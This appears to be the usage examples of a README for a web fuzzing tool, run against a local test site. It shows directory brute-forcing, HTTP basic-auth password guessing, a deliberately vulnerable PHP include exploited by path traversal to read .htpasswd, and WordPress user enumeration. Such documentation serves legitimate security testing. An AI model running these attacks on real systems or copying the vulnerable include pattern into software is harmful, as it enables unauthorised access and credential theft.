## Examples
### Brute forcing paths
We use a dictionary of file names and hide 404 codes:

    $ cat testdic.txt
    admin
    temp
    sarasasasa
    backdoor
    user
    panel
    aaaaa

    $ python2 popper.py 'http://localhost/poppertest/[file].php' --file testdic.txt --hc 404
    302 8    194      0.000137 http://localhost/poppertest/user.php
    200 7    166      5.3e-05  http://localhost/poppertest/panel.php
    401 57   1539     0.000602 http://localhost/poppertest/admin.php

Hidden: 5


### Brute forcing http user and password
Now we use two payloads, one for users and another for passwords, brute forcing both at the same time. --file arguments will be used in order:

    $ cat userdic.txt
    user
    root
    admin

    $ cat passworddic.txt
    1234
    12345
    admin
    letmein
    toor

    Hidden: 23
    $ python2 popper.py 'http://[file]:[file]@localhost/poppertest/admin.php' --file userdic.txt passworddic.txt
    401 57   1539     0.00254  http://root:12345@localhost/poppertest/admin.php
    401 57   1539     0.001611 http://root:1234@localhost/poppertest/admin.php
    401 57   1539     0.001897 http://root:letmein@localhost/poppertest/admin.php
    401 57   1539     0.001712 http://root:toor@localhost/poppertest/admin.php
    401 57   1539     0.001264 http://user:12345@localhost/poppertest/admin.php
    401 57   1539     0.00077  http://user:letmein@localhost/poppertest/admin.php
    401 57   1539     0.001313 http://user:admin@localhost/poppertest/admin.php
    401 57   1539     0.001513 http://user:1234@localhost/poppertest/admin.php
    401 57   1539     5.6e-05  http://admin:1234@localhost/poppertest/admin.php
    401 57   1539     4.9e-05  http://admin:toor@localhost/poppertest/admin.php
    401 57   1539     6.4e-05  http://admin:admin@localhost/poppertest/admin.php
    401 57   1539     0.005372 http://admin:12345@localhost/poppertest/admin.php
    200 8    175      0.000302 http://admin:letmein@localhost/poppertest/admin.php
    401 57   1539     0.000719 http://user:toor@localhost/poppertest/admin.php
    401 57   1539     0.000617 http://root:admin@localhost/poppertest/admin.php

    Hidden: 0

We can, again, hide uninteresting results:

    $ python2 popper.py 'http://[file]:[file]@localhost/poppertest/admin.php' --file userdic.txt passworddic.txt --hc 401
    200 8    175      0.004078 http://admin:letmein@localhost/poppertest/admin.php

    Hidden: 14


### Brute forcing LFI

    $ cat include.php
    <?PHP include('./'.$_GET['include']);

    $ python2 popper.py 'http://localhost/poppertest/news/include.php?include=[repeat].htpasswd' --repeat 10 ../
    200 11   552      0.000613 http://localhost/poppertest/news/include.php?include=../../../../.htpasswd
    200 11   546      0.001891 http://localhost/poppertest/news/include.php?include=../../../.htpasswd
    200 11   588      0.001274 http://localhost/poppertest/news/include.php?include=../../../../../../../../../../.htpasswd
    200 11   534      0.001067 http://localhost/poppertest/news/include.php?include=../.htpasswd
    200 11   564      0.001231 http://localhost/poppertest/news/include.php?include=../../../../../../.htpasswd
    200 11   570      0.00132  http://localhost/poppertest/news/include.php?include=../../../../../../../.htpasswd
    200 11   582      0.002143 http://localhost/poppertest/news/include.php?include=../../../../../../../../../.htpasswd
    200 9    188      0.004141 http://localhost/poppertest/news/include.php?include=../../.htpasswd
    200 11   576      0.003028 http://localhost/poppertest/news/include.php?include=../../../../../../../../.htpasswd
    200 11   558      3e-05    http://localhost/poppertest/news/include.php?include=../../../../../.htpasswd

There is one request with 9 lines instead of 11. This is the one with the .htpasswd file


### Enumerating wordpress users
Now we will be using [range] to find some numeric ids and --threads 30 to speed up the process. This particular website redirects valid ids to /author/USERNAME

    python2 popper.py 'http://localhost/poppertest/wordpress/?author=[range]' --range 1,1000 --threads 30 --hc 404
    301 11   436      0.360397 http://localhost/poppertest/wordpress/?author=2
    301 11   433      0.357481 http://localhost/poppertest/wordpress/?author=5
    301 11   434      0.375045 http://localhost/poppertest/wordpress/?author=1
    301 11   433      0.631637 http://localhost/poppertest/wordpress/?author=79
    301 11   437      0.595769 http://localhost/poppertest/wordpress/?author=91
    301 11   433      0.632835 http://localhost/poppertest/wordpress/?author=102
    200 375  18685    0.873635 http://localhost/poppertest/wordpress/?author=101
    301 11   442      0.571062 http://localhost/poppertest/wordpress/?author=144
    301 11   433      0.604039 http://localhost/poppertest/wordpress/?author=147
    301 11   433      0.60503  http://localhost/poppertest/wordpress/?author=157
    301 11   434      0.599448 http://localhost/poppertest/wordpress/?author=194
    301 11   433      0.686675 http://localhost/poppertest/wordpress/?author=203
    301 11   433      0.489501 http://localhost/poppertest/wordpress/?author=232
    301 11   434      0.456722 http://localhost/poppertest/wordpress/?author=267
    301 11   435      0.603057 http://localhost/poppertest/wordpress/?author=422
    301 11   433      0.691517 http://localhost/poppertest/wordpress/?author=558
    301 11   434      0.457889 http://localhost/poppertest/wordpress/?author=678
    301 11   434      0.615434 http://localhost/poppertest/wordpress/?author=780
    301 11   438      0.589926 http://localhost/poppertest/wordpress/?author=844

    Hidden: 981


### Other protocols
It may work with other protocols supported by libcurl
    $ python2 popper.py 'ftp://localhost/[file]/' --file testdic 
    Giving up on ftp://localhost/qwe/: Server denied you to change to the given directory
    Giving up on ftp://localhost/dddddd/: Server denied you to change to the given directory
    226 1    61       0.18242  ftp://localhost/somefolder/
    Giving up on ftp://localhost/asd/: Server denied you to change to the given directory
    226 182  13521    0.257413 ftp://localhost/otherfolder/

    $ python2 popper.py 'gopher://localhost/1/[file]/' --file testdic 
    0   1    57       0.383794 gopher://localhost/1/asd/
    0   2    167      0.397954 gopher://localhost/1/Internet/
    0   1    60       0.407395 gopher://localhost/1/dddddd/
    0   16   1124     0.400861 gopher://localhost/1/Computers/
    0   1    57       0.4052   gopher://localhost/1/qwe/
